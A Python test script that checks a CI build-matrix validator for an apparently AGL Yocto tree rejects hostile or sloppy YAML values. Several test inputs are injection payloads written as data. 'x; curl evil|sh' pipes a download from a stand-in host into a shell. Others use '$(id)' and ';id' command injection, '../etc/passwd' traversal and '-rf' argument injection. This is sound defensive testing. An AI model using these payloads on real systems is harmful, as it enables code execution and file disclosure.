#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
"""Checks that _matrix.py accepts the shapes we use and rejects hostile or sloppy values of an untrusted ci/build-matrix.yaml
(the file of a pull request, fork or not). Run: python3 ci/scripts/_matrix_test.py   (needs PyYAML, nothing else)."""
import importlib
import json
import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import yaml  # noqa: E402

GOOD = {
    "needs": [],
    "machine_eula": {"h3ulcb": True},
    "images": [
        {"target": "agl-image-minimal", "features": [], "sdk": False, "machines": "ci", "tiers": "gate"},
        {"target": "agl-xen-image-test", "features": ["agl-xen"], "sdk": False,
         "machines": ["qemux86-64", {"raspberrypi5": {"tiers": ["nightly"]}}], "tiers": ["dispatch"]},
        {"target": "board", "features": [], "sdk": False, "machines": [{"h3ulcb": {"tiers": ["dispatch"]}}], "tiers": ["dispatch"]},
    ],
    "check_layers": {"default": [], "dependency_roots": ["meta-agl"], "layers": ["meta-agl/meta-agl-core",
                     {"meta-agl-devel/meta-uhmi": {"additional_layers": ["meta-agl/meta-agl-core"]}}]},
}


def expand(data, extra_repo=None):
    with tempfile.TemporaryDirectory() as t:
        for name, d in {"meta-agl": data, **(extra_repo or {})}.items():
            p = Path(t, name, "ci"); p.mkdir(parents=True)
            (p / "build-matrix.yaml").write_text(yaml.safe_dump(d))
        os.environ["AGL_TREE"] = t
        os.environ.pop("AGL_SCOPE", None)
        import _matrix
        importlib.reload(_matrix)
        return _matrix.expand_entries()


def mutate(**kv):
    d = json.loads(json.dumps(GOOD))
    for k, v in kv.items():
        d[k] = v
    return d


def image(**kv):
    d = json.loads(json.dumps(GOOD))
    d["images"][0].update(kv)
    return d


def rejects(data, text, **kw):
    try:
        expand(data, **kw)
    except ValueError as e:
        assert text in str(e), f"wrong message: {e}"
        return
    raise AssertionError(f"accepted although it must fail ({text})")


entries = expand(GOOD)
assert any(e["target"] == "agl-image-minimal" and e["machine"] == "qemux86-64" and "push-pr" in e["tiers"] for e in entries)
assert not any("push-pr" in e["tiers"] for e in entries if e["machine"] == "h3ulcb")

rejects(image(target="x; curl evil|sh"), "target")
rejects(image(target="../etc/passwd"), "target")
rejects(image(target="a b"), "target")
rejects(image(target="-rf"), "target")
rejects(image(features=["agl/demo"]), "feature")
rejects(image(features=["..x"]), "feature")
rejects(image(machines=["../../x"]), "machine")
rejects(image(machines=[{"qemux86-64;id": {}}]), "machine")
rejects(image(machines=[{"qemux86-64": {"tiers": ["push-pr", "root"]}}]), "tiers")
rejects(image(tiers=["everything"]), "tiers")
rejects(image(sdk="yes"), "sdk")
rejects(image(machines="nope"), "unknown machine set")
rejects(image(tiers="nope"), "unknown tier preset")
rejects(mutate(needs=["../x"]), "needs entry")
rejects(mutate(machine_eula={"h3ulcb": "yes"}), "machine_eula value")
rejects(mutate(machine_eula={"h3ulcb;x": True}), "machine_eula machine")
rejects(mutate(check_layers={"default": ["../x"]}), "check_layers.default")
rejects(mutate(check_layers={"default": ["/etc"]}), "check_layers.default")
rejects(mutate(check_layers={"layers": ["a/../b"]}), "check_layers.layers")
rejects(mutate(check_layers={"layers": [{"a": {"additional_layers": ["../b"]}}]}), "additional_layers")
# an EULA machine must not be built for a pull request
d = mutate(); d["images"][2]["machines"] = [{"h3ulcb": {"tiers": ["push-pr"]}}]
rejects(d, "EULA")
d = mutate(); d["images"][2]["machines"] = ["h3ulcb"]; d["images"][2]["tiers"] = ["push-pr", "dispatch"]
rejects(d, "EULA")
# size cap
big = mutate(); big["images"] = [{"target": f"t{i}", "features": [], "sdk": False, "machines": ["qemux86-64"], "tiers": ["dispatch"]} for i in range(130)]
rejects(big, "allowed")
# a hostile file of ANOTHER repo of the tree is rejected too (it is loaded, even if out of scope)
rejects(GOOD, "target", extra_repo={"meta-agl-demo": {"needs": ["meta-agl"], "machine_eula": {}, "images": [
    {"target": "$(id)", "features": [], "sdk": False, "machines": ["qemux86-64"], "tiers": ["dispatch"]}]}})
print("matrix validation: all checks passed")
